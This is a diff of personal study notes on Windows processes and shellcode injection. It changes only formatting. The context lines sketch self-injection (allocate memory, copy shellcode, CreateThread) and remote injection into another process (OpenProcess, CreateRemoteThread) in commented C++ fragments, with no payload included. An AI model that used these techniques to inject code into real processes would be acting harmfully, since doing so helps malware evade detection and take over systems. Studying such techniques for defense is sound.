@@ -1,12 +1,9 @@
 - Processes - Identified by PID
-  collapsed:: true
 	- Types
 		- User Mode
 		- Kernel Mode -> Higher Privileges
 	- PIDs can be used to get *Handles* to processes
-	- ![image.png](../assets/image_1721972523672_0.png)
 - Windows API
-  collapsed:: true
 	- some APIs return pointers to `struct`
 - Injection Attack -> Fileless shellcode execution
 	- Find an existing process and inject malicious shell code
@@ -23,7 +20,6 @@
 -
 ---
 - **self-injection.cpp**
-  collapsed:: true
 	- Step 1 -> Allocating memory
 		-
 		  ```
@@ -39,14 +35,13 @@
 		-
 		  ```
 		  RtlCopyMemory(allocated_mem, # destination
-		  			  shellcode, # source
+				shellcode, # source
 		                sizeof(shellcode));
 		  ```
 	- Step 3 -> Execute Shell Code
 		-
 		  ```
-		  HANDLE hThread =  CreateThread(NULL,
-		  							   0,
+		  HANDLE hThread =  CreateThread(NULL,0,
 		                                 (LPTHREAD_START_ROUTINE)allocated_mem, # Start of the code that must be executed when thread is created 
 		                                 NULL,
 		                                 0,
@@ -60,7 +55,7 @@
 		-
 		  ```
 		  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, // access all process resources
-		  							  FALSE, // child processes are not inherited by handle
+		  				FALSE, // child processes are not inherited by handle
 		                                pe32.th32ProcessID); // since PIDs change, take a snapshot and obtain PID of required software
 		  ```
 	- Step 1 -> Allocate Virtual Memory
@@ -87,10 +82,10 @@
 			-
 			  ```
 			  	HANDLE hThread = CreateRemoteThread(hProcess,
-			  										NULL, 
-			  										0,
-			  										(LPTHREAD_START_ROUTINE)allocated_mem,
-			  										NULL, 
-			  										0, 
-			  										NULL);
+								NULL, 
+								0,
+								(LPTHREAD_START_ROUTINE)allocated_mem,
+								NULL, 
+								0, 
+								NULL);
 			  ```
